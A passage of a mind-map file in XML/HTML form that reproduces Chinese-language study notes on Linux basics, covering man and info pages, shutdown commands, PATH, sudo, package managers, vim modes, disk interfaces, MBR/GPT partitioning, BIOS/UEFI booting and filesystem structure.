          用户在 shell 环境中可以操作的指令或者可执行文件
        </td>
      </tr>
      <tr>
        <td>
          5
        </td>
        <td>
          配置文件
        </td>
      </tr>
      <tr>
        <td>
          8
        </td>
        <td>
          系统管理员可以使用的管理指令
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_858928742" CREATED="1754750448829" MODIFIED="1754750448832"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. info
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. info" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-info">
</a>
    <p dir="auto">
      info 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以跳转。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_537189691" CREATED="1754750448833" MODIFIED="1754750448836"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. doc
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. doc" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#4-doc">
</a>
    <p dir="auto">
      /usr/share/doc 存放着软件的一整套说明文件。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_264956381" CREATED="1754750448836" MODIFIED="1754750448836"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      关机
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1979460409" CREATED="1754750448838" MODIFIED="1754750448841"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. who
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. who" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-who">
</a>
    <p dir="auto">
      在关机前需要先使用 who 命令查看有没有其它用户在线。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1527543547" CREATED="1754750448842" MODIFIED="1754750448845"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. sync
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. sync" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-sync">
</a>
    <p dir="auto">
      为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘，因此关机之前需要先进行 sync 同步操作。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_150548263" CREATED="1754750448846" MODIFIED="1754750448848"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. shutdown
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. shutdown" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-shutdown">
</a>
    <pre>## shutdown [-krhc] 时间 [信息]
-k ： 不会关机，只是发送警告信息，通知所有在线的用户
-r ： 将系统的服务停掉后就重新启动
-h ： 将系统的服务停掉后就立即关机
-c ： 取消已经在进行的 shutdown</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_893199670" CREATED="1754750448848" MODIFIED="1754750448851"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      PATH
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: PATH" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#path">
</a>
    <p dir="auto">
      可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。
    </p>
    <pre>/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_574018655" CREATED="1754750448852" MODIFIED="1754750448854"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      sudo
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: sudo" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#sudo">
</a>
    <p dir="auto">
      sudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_472057188" CREATED="1754750448855" MODIFIED="1754750448858"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      包管理工具
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 包管理工具" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#包管理工具">
</a>
    <p dir="auto">
      RPM 和 DPKG 为最常见的两类软件包管理工具：
    </p>
    <ul dir="auto">
      <li>
        RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为许多 Linux 系统的既定软件标准。YUM 基于 RPM，具有依赖管理和软件升级功能。
      </li>
      <li>
        与 RPM 竞争的是基于 Debian 操作系统的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1975085545" CREATED="1754750448859" MODIFIED="1754750448864"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      发行版
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 发行版" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#发行版">
</a>
    <p dir="auto">
      Linux 发行版是 Linux 内核及各种应用软件的集成版本。
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          基于的包管理工具
        </th>
        <th>
          商业发行版
        </th>
        <th>
          社区发行版
        </th>
      </tr>
      <tr>
        <td>
          RPM
        </td>
        <td>
          Red Hat
        </td>
        <td>
          Fedora / CentOS
        </td>
      </tr>
      <tr>
        <td>
          DPKG
        </td>
        <td>
          Ubuntu
        </td>
        <td>
          Debian
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_918399089" CREATED="1754750448864" MODIFIED="1754750448867"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      VIM 三个模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: VIM 三个模式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#vim-三个模式">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/07692bd6dd6d0b166c2ae41761e52e7cc87cc2d7547f1c46eb0f497b4da48039/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230393030323831383632362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/07692bd6dd6d0b166c2ae41761e52e7cc87cc2d7547f1c46eb0f497b4da48039/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230393030323831383632362e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191209002818626.png"/></a><br/>
    <ul dir="auto">
      <li>
        一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容；
      </li>
      <li>
        编辑模式（Insert mode）：按下 &quot;i&quot; 等按键之后进入，可以对文本进行编辑；
      </li>
      <li>
        指令列模式（Bottom-line mode）：按下 &quot;:&quot; 按键之后进入，用于保存退出等操作。
      </li>
    </ul>
    <p dir="auto">
      在指令列模式下，有以下命令用于离开或者保存文件。
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          命令
        </th>
        <th>
          作用
        </th>
      </tr>
      <tr>
        <td>
          :w
        </td>
        <td>
          写入磁盘
        </td>
      </tr>
      <tr>
        <td>
          :w!
        </td>
        <td>
          当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关
        </td>
      </tr>
      <tr>
        <td>
          :q
        </td>
        <td>
          离开
        </td>
      </tr>
      <tr>
        <td>
          :q!
        </td>
        <td>
          强制离开不保存
        </td>
      </tr>
      <tr>
        <td>
          :wq
        </td>
        <td>
          写入磁盘后离开
        </td>
      </tr>
      <tr>
        <td>
          :wq!
        </td>
        <td>
          强制写入磁盘后离开
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_1990148279" CREATED="1754750448868" MODIFIED="1754750448870"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      GNU
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: GNU" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#gnu">
</a>
    <p dir="auto">
      GNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议（GNU General Public License），包含了以下内容：
    </p>
    <ul dir="auto">
      <li>
        以任何目的运行此程序的自由；
      </li>
      <li>
        再复制的自由；
      </li>
      <li>
        改进此程序，并公开发布改进的自由。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_894553285" CREATED="1754750448872" MODIFIED="1754750448874"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      开源协议
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 开源协议" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#开源协议">
</a>
    <ul dir="auto">
      <li>
        <a href="https://choosealicense.com/" rel="nofollow">Choose an open source license</a>
      </li>
      <li>
        <a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html" rel="nofollow">如何选择开源许可证？</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_263341056" CREATED="1754750448875" MODIFIED="1754750448875"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、磁盘
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1367623445" CREATED="1754750448877" MODIFIED="1754750448877"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      磁盘接口
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1941191713" CREATED="1754750448879" MODIFIED="1754750448881"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. IDE
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. IDE" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-ide">
</a>
    <p dir="auto">
      IDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ecdb69eca6206f4686558786cb534d5e29043fa459ded4ffb8e1b606ae892095/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39323439313463302d363630632d346534612d626263302d3164663131343665373531362e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/ecdb69eca6206f4686558786cb534d5e29043fa459ded4ffb8e1b606ae892095/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39323439313463302d363630632d346534612d626263302d3164663131343665373531362e6a7067" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/924914c0-660c-4e4a-bbc0-1df1146e7516.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1823501115" CREATED="1754750448882" MODIFIED="1754750448883"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. SATA
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. SATA" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-sata">
</a>
    <p dir="auto">
      SATA 全称 Serial ATA，也就是使用串口的 ATA 接口，抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能。SATA-II 的接口速度为 300MB/s，而 SATA-III 标准可达到 600MB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/608cce16a58489d2a7ff954260d0bbf23706c5b6e1c870fef1472ca150b3b71e/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66396632613136622d343834332d343464312d393735392d6337343537373265396263662e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/608cce16a58489d2a7ff954260d0bbf23706c5b6e1c870fef1472ca150b3b71e/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66396632613136622d343834332d343464312d393735392d6337343537373265396263662e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9f2a16b-4843-44d1-9759-c745772e9bcf.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1840503319" CREATED="1754750448883" MODIFIED="1754750448886"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. SCSI
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. SCSI" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-scsi">
</a>
    <p dir="auto">
      SCSI 全称是 Small Computer System Interface（小型机系统接口），SCSI 硬盘广为工作站以及个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/530c09d7b69a4a8aaf88eee73727cc48265f0804039a5e9172ff6ac139b48b79/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66303537343032352d633531342d343966352d613539312d3664366137316632373166372e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/530c09d7b69a4a8aaf88eee73727cc48265f0804039a5e9172ff6ac139b48b79/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66303537343032352d633531342d343966352d613539312d3664366137316632373166372e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f0574025-c514-49f5-a591-6d6a71f271f7.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_48165568" CREATED="1754750448886" MODIFIED="1754750448888"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. SAS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. SAS" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#4-sas">
</a>
    <p dir="auto">
      SAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也通过缩小连接线改善系统内部空间等。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/929864fe4740c6e9271d4645ab07931a69f9ec37b0feef3ecbd53a76b596f0d1/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36373239626161302d353764372d343831372d623361612d3531386362636366383234632e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/929864fe4740c6e9271d4645ab07931a69f9ec37b0feef3ecbd53a76b596f0d1/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36373239626161302d353764372d343831372d623361612d3531386362636366383234632e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6729baa0-57d7-4817-b3aa-518cbccf824c.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_191900671" CREATED="1754750448890" MODIFIED="1754750448892"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      磁盘的文件名
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 磁盘的文件名" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#磁盘的文件名">
</a>
    <p dir="auto">
      Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下：
    </p>
    <ul dir="auto">
      <li>
        IDE 磁盘：/dev/hd[a-d]
      </li>
      <li>
        SATA/SCSI/SAS 磁盘：/dev/sd[a-p]
      </li>
    </ul>
    <p dir="auto">
      其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_125063800" CREATED="1754750448892" MODIFIED="1754750448892"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、分区
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_824127010" CREATED="1754750448894" MODIFIED="1754750448896"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分区表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分区表" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#分区表">
</a>
    <p dir="auto">
      磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1610691086" CREATED="1754750448896" MODIFIED="1754750448898"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. MBR
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. MBR" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-mbr">
</a>
    <p dir="auto">
      MBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。
    </p>
    <p dir="auto">
      分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它使用其它扇区来记录额外的分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。
    </p>
    <p dir="auto">
      Linux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_553123549" CREATED="1754750448898" MODIFIED="1754750448900"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. GPT
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. GPT" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-gpt">
</a>
    <p dir="auto">
      扇区是磁盘的最小存储单位，旧磁盘的扇区大小通常为 512 bytes，而最新的磁盘支持 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。
    </p>
    <p dir="auto">
      GPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。
    </p>
    <p dir="auto">
      GPT 没有扩展分区概念，都是主分区，每个 LBA 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。
    </p>
    <p dir="auto">
      MBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 2<sup>33</sup>&#xa0;TB = 8 ZB。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/09ee854e4f5f00bcfc619e829ce842c874337c00300523639547cec39c69fe31/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f475549445f506172746974696f6e5f5461626c655f536368656d652e7376672e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/09ee854e4f5f00bcfc619e829ce842c874337c00300523639547cec39c69fe31/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f475549445f506172746974696f6e5f5461626c655f536368656d652e7376672e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/GUID_Partition_Table_Scheme.svg.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1530792749" CREATED="1754750448901" MODIFIED="1754750448901"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      开机检测程序
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1545428250" CREATED="1754750448904" MODIFIED="1754750448906"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. BIOS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. BIOS" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-bios">
</a>
    <p dir="auto">
      BIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3c1af24a52cc134be2ab4c89353f156a9f2d4748b8ceda6afd397b915882614f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35303833316136662d323737372d343665612d613537312d3239663233633835636332312e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/3c1af24a52cc134be2ab4c89353f156a9f2d4748b8ceda6afd397b915882614f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35303833316136662d323737372d343665612d613537312d3239663233633835636332312e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/50831a6f-2777-46ea-a571-29f23c85cc21.jpg"/>
    </a><br/>
    

    <p dir="auto">
      BIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。
    </p>
    <p dir="auto">
      主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。
    </p>
    <p dir="auto">
      下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5e29220b34a98cd9d578c18e1e54950be30d1082eec5c3bb4c8117f25695c5bf/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66393030663236362d613332332d343262322d626334332d3231386664623838313161382e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/5e29220b34a98cd9d578c18e1e54950be30d1082eec5c3bb4c8117f25695c5bf/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66393030663236362d613332332d343262322d626334332d3231386664623838313161382e6a7067" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f900f266-a323-42b2-bc43-218fdb8811a8.jpg"/>
    </a><br/>
    

    <p dir="auto">
      安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1282482394" CREATED="1754750448907" MODIFIED="1754750448908"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. UEFI
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. UEFI" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-uefi">
</a>
    <p dir="auto">
      BIOS 不可以读取 GPT 分区表，而 UEFI 可以。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1579287581" CREATED="1754750448909" MODIFIED="1754750448909"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、文件系统
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1720424493" CREATED="1754750448911" MODIFIED="1754750448914"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分区与文件系统
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分区与文件系统" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#分区与文件系统">
</a>
    <p dir="auto">
      对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1285742477" CREATED="1754750448914" MODIFIED="1754750448917"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      组成
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 组成" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#组成">
</a>
    <p dir="auto">
      最主要的几个组成部分如下：
    </p>
    <ul dir="auto">
      <li>
        inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号；
      </li>
      <li>
        block：记录文件的内容，文件太大时，会占用多个 block。
      </li>
    </ul>
    <p dir="auto">
      除此之外还包括：
    </p>
    <ul dir="auto">
      <li>
        superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等；
      </li>
      <li>
        block bitmap：记录 block 是否被使用的位图。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e270ebc873259598830aec2d445100b334fe9725bb78d1ae41751d44440f9f80/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f4253445f6469736b2e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/e270ebc873259598830aec2d445100b334fe9725bb78d1ae41751d44440f9f80/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f4253445f6469736b2e706e67" width="800" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/BSD_disk.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_997597658" CREATED="1754750448917" MODIFIED="1754750448920"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文件读取
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 文件读取" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#文件读取">
</a>
    <p dir="auto">
      对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中查找文件内容所在的所有 block，然后把所有 block 的内容读出来。
    </p>
